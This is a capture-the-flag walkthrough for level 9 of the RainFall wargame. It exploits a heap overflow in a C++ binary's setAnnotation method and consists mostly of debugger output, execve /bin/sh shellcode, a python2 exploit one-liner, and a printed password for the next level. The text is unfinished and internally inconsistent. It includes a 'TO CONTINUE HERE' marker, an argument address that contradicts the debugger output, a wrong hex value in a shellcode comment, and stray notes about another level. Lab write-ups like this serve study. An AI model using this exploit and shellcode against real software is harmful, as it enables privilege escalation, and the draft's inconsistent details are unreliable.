# Walkthrough for Level 9

## Understanding the Binary

The `level9` binary is a C++ program that contains a class `N`. The `N` class has:
- an `annotation` attribute of type `char*`
- an `ammount` attribute of type `int`
- a method `setAnnotation(char*)`
- an overloaded operator `+` that adds the `ammount` of another instance of the `N` class to the `ammount` of the current instance
- an overloaded operator `-` that subtracts the `ammount` of another instance of the `N` class from the `ammount` of the current instance

In the main function, two instances of the `N` class are created, and the `setAnnotation` method is called on one of
them to add the user's input as an annotation. Then, the program calls the `operator+` method of one of the instances to
add the `ammount` of the other instance to it.

## The offset 

Using [pwndbg](https://github.com/pwndbg/pwndbg) we create an arbitrary long cyclic pattern of 120 characters.

```shell
pwndbg> cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
```

We give this pattern as input to the binary.

```shell
pwndbg> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
...SNIP...
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
...SNIP...
─────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
   0x8048677 <main+131>    call   N::setAnnotation(char*)     <N::setAnnotation(char*)>
 
   0x804867c <main+136>    mov    eax, dword ptr [esp + 0x10]
   0x8048680 <main+140>    mov    eax, dword ptr [eax]
 ► 0x8048682 <main+142>    mov    edx, dword ptr [eax]            <Cannot dereference [0x62616163]>
```

The program segfaults when it tries to dereference the invalid address `0x62616163`, which corresponds to the string
`caab` which its part of our cyclic pattern. We find the offset of this string at the cyclic pattern using the
`cyclic -l` command.

```shell
pwndbg> cyclic -l caab
Finding cyclic pattern of 4 bytes: b'caab' (hex: 0x63616162)
Found at offset 108
```

## The Double Dereference

Putting a breakpoint after `setAnnotation` and rerunning the program with the same argument as before we see that the
program copies the part of our cyclic pattern `caab` and stores in `eax` (<main+140>). Then it will attempt,
unsuccessfully, to dereference `eax` once again and store the dereferenced value in `edx` (<main+142>). Finally, it
makes a call to the dereferenced value stored in `edx` (<main+159>). Summarizing, we have a double dereference and an
execution.

```shell
pwndbg> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
...SNIP...
─────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
   0x8048677 <main+131>    call   N::setAnnotation(char*)     <N::setAnnotation(char*)>
 
 ► 0x804867c <main+136>    mov    eax, dword ptr [esp + 0x10]     EAX, [0xffffd170] => 0x804d420 ◂— 'caabdaabeaab'
   0x8048680 <main+140>    mov    eax, dword ptr [eax]            EAX, [0x804d420] => 0x62616163 ('caab')
   0x8048682 <main+142>    mov    edx, dword ptr [eax]            <Cannot dereference [0x62616163]>
   0x8048684 <main+144>    mov    eax, dword ptr [esp + 0x14]
   0x8048688 <main+148>    mov    dword ptr [esp + 4], eax
   0x804868c <main+152>    mov    eax, dword ptr [esp + 0x10]
   0x8048690 <main+156>    mov    dword ptr [esp], eax
   0x8048693 <main+159>    call   edx
...SNIP...
```

## The address of our argument

// TO CONTINUE HERE


```shell
(gdb) x/s $eax
0x804a00c:       "AAAA"
```

The address of the argument is `0x804a00c`, in little-endian is `\x0c\xa0\x04\x08`.

We will also need the address of our argument + 4, so 0x804A010. In little-endian is `\x10\xa0\x04\x08`.



### The Payload

A `shellcode` is a sequence of instructions, often written in assembly language, designed to be executed directly by a
computer's processor. We look for a `shellcode` that spawns a shell and that is compatible with our machine architecture.
We find one that it works, and we use it as our payload (https://shell-storm.org/shellcode/files/shellcode-575.html)

```c
/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/

int main(){

char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
"\x89\xe3" // mov ebx, esp
"\x31\xc9" // xor ecx, ecx
"\xcd\x80"; // int 0x80

((void (*)()) sc)();
}

/*
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
*/
--
ipv
```


## Crafting the Exploit

We create the exploit using python and save it to a file. The exploit consists of the following parts:
- The address of our argument + 4 in little-endian: `\x10\xa0\x04\x08`
- The payload
- Padding to fill the rest of the buffer with 83 `A`s. 108 (offset) - 25 (all the previous bytes) = 83 
- The address of our argument in little-endian: `\x0c\xa0\x04\x08`

```shell
python2 -c 'print "\x10\xa0\x04\x08\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"' > /tmp/exploit9
```

## Running the Exploit

Since we need to keep a terminal open to control the shell spawned involuntarily by the `level9` binary we craft the
next command to read the exploit from a file and then from standard input. After sending a `SIGINT` or a `SIGQUIT` we
are able to execute commands as `bonus0` user.

```shell
level9@RainFall:~$ ./level9 "$(cat /tmp/exploit9 ; cat)"
^\$ whoami
bonus0
```

## Reading the Password

```shell
$ pwd      
/home/user/level9
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```




To know the rights of writing, read and execute the different memory segments, we can use the command:
```shell
shell cat /proc/$(pgrep level2)/maps
```

```shell
display/5i $pc-8
```

```shell
Breakpoint 2, 0x0804870e in N::setAnnotation(char*) ()
(gdb) p $esp+8
$1 = (void *) 0xbffff694
(gdb) p *(char**)($esp+8)
(gdb) x/112bx *(char**)($esp+8)
0xbffff88a:     0x58    0x7c    0xea    0xb7    0x60    0x60    0xd8    0xb7
0xbffff892:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff89a:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8a2:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8aa:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8b2:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8ba:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8c2:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8ca:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8d2:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8da:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8e2:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8ea:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8f2:     0x41    0x41    0x41    0x41    0xf4    0xf6    0xff    0xbf
```